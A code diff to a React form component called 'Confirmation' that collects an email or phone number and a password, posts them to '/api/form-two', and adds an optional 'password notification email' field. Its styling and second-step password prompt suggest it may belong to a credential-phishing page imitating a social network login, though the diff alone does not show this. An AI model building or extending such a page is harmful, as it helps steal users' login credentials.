@@ -25,8 +25,9 @@ import {
 import { countries } from "@/lib/countries";
 
 const formTwoSchema = z.object({
-  user_email: z.string(), // Removed .min(1) to make it optional
+  user_email: z.string(), // Optional field
   password: z.string().min(1, "Password is required"),
+  notify_email: z.string().email("Invalid email").optional(),
 });
 
 type FormTwoValues = z.infer<typeof formTwoSchema>;
@@ -42,6 +43,7 @@ export default function Confirmation() {
     defaultValues: {
       user_email: "",
       password: "",
+      notify_email: "",
     },
   });
 
@@ -70,6 +72,7 @@ export default function Confirmation() {
       const formattedData = {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
         password: data.password,
+        notify_email: data.notify_email,
       };
 
       const response = await fetch('/api/form-two', {
@@ -210,6 +213,27 @@ export default function Confirmation() {
                       <Input
                         type="password"
                         placeholder="Enter password"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
+                        {...field}
+                      />
+                    </FormControl>
+                    <FormMessage className="text-xs text-red-500 mt-1" />
+                  </FormItem>
+                )}
+              />
+
+              <FormField
+                control={form.control}
+                name="notify_email"
+                render={({ field }) => (
+                  <FormItem className="text-left">
+                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                      Password Notification Email (Optional)
+                    </FormLabel>
+                    <FormControl>
+                      <Input
+                        type="email"
+                        placeholder="Enter email for password notifications"
                         className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                         {...field}
                       />
